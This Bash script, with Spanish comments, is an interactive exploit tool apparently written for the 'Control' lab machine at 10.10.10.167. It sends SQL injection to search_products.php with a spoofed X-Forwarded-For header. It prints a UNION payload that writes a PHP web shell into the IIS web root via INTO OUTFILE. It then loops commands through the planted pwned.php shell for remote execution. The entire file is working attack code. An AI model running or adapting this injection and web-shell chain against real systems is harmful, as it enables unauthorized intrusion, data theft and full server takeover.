#!/bin/bash
#
trap ctrl_c INT

color_prompt="\033[1;93m" # Amarillo
color_output="\033[1;32m" # Verde
color_reset="\033[0m"     # Restablecer color

function ctrl_c() {
    echo -e "\n\n\033[0;31m[!] Exiting...\033[0m"
    exit 1
}
main_url="http://10.10.10.167/search_products.php"

  echo -ne "\n${color_prompt}[*] Enter 'query' to run a SQL query, 'command' to run a system command, or 'exit' to quit:\n${color_reset}"
  echo -ne "\n${color_prompt}[*] After you retrieve the data from the database, try injecting .php files to execute commands:\n${color_reset}"

  echo -ne "\n${color_prompt}[>] Ex:' union select 1,2,3,\"<?php system($_REQUEST['cmd']); ?>\",5,6 into outfile 'C:\\\\\\\\\\\\\\\inetpub\\\\\\\\\\\\\\\wwwroot\\\\\\\\\\\\\\\cmd.php'-- - \n\n${color_reset}"

function Execute_Query {
  sql_query="$1"
  
  output=$(curl -s -X POST "$main_url" -H "X-Forwarded-For: 192.168.4.28" -d "productName=$sql_query" | awk '/<tbody>/,/<\/tbody>/' | html2text | sed 's/1| 2| 3| //' | sed 's/| 5| 6//' | sed 's/|  |  |  |//')

  echo -e "${color_prompt}$output${color_reset}"
}
function Execute_Command {
  main_url_command="http://10.10.10.167/pwned.php"
  while true; do
  
    command="$1"
  read -p "╭─ ╱  ~/10.10.10.167_Control ╱ ✔ 
╰─❯ " command
    output=$(curl -s -X GET -G "$main_url_command" --data-urlencode "cmd=$command" | sed 's/1	2	3	//' | sed 's/	5	6//')
    echo -e "${color_prompt}$output${color_reset}"
  done
}

while true; do 
  read -p "╭─ ╱  ~/10.10.10.167_Control ╱ ✔ 
╰─❯ " choice

  if [ "$choice" == "query" ]; then
    read -p "Enter SQL query: " sql_query
    Execute_Query "$sql_query"
  elif [ "$choice" == "command" ]; then
    Execute_Command "$command"
  elif [ "$choice" == "exit" ]; then
    break 
  else
    echo -e "\n${color_prompt}Invalid choice. Enter 'query' to run a SQL query, 'command' to run a system command, or 'exit' to quit${color_reset}\n"
  fi
done
